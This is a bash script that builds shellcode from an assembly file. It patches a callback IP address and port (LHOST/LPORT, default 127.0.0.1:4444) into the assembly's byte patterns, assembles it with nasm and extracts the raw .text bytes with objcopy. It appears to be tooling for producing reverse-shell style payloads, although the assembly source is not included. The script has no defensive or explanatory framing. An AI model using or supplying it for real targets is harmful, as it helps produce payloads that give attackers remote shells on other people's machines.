#!/bin/bash
set -e

ASM_FILE="$1"
if [ -z "$ASM_FILE" ]; then
    echo "Usage: $0 <assembly_file.asm>" >&2
    exit 1
fi

if [ ! -f "$ASM_FILE" ]; then
    echo "Error: Assembly file not found: $ASM_FILE" >&2
    exit 1
fi

LHOST="${LHOST:-127.0.0.1}"
LPORT="${LPORT:-4444}"

IFS='.' read -r -a IP_PARTS <<< "$LHOST"
IP_HEX=$(printf "0x%02x, 0x%02x, 0x%02x, 0x%02x" "${IP_PARTS[0]}" "${IP_PARTS[1]}" "${IP_PARTS[2]}" "${IP_PARTS[3]}")

PORT_HEX=$(printf "0x%04x" "$LPORT")
PORT_HIGH=$(printf "0x%02x" $((LPORT >> 8)))
PORT_LOW=$(printf "0x%02x" $((LPORT & 0xFF)))

sed -e "s/127, 0, 0, 1/$IP_HEX/g" \
    -e "s/0x11, 0x5c/$PORT_HIGH, $PORT_LOW/g" \
    "$ASM_FILE" > /tmp/shellcode.asm

nasm -f elf64 -o /tmp/shellcode.o /tmp/shellcode.asm

objcopy -O binary -j .text /tmp/shellcode.o /tmp/shellcode.bin

cat /tmp/shellcode.bin
